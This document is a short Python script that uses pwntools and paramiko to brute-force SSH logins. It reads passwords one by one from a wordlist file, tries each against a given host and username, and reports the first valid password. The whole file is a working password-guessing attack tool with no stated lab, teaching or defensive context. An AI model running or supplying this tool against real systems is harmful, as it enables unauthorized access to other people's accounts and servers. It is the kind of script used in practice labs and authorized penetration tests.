from pwn import *
import paramiko
import sys

if len(sys.argv) !=4:
    print("Invalid Argument!")
    print(">> {} <host> <user> <passwordfile>".format(sys.argv[0]))
    exit(0)

    
host = sys.argv[1]
username = sys.argv[2]
attempts = 0
pwd = sys.argv[3]

with open(pwd, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attrempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1) # only wait for 1 for authentication timeout
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts+=1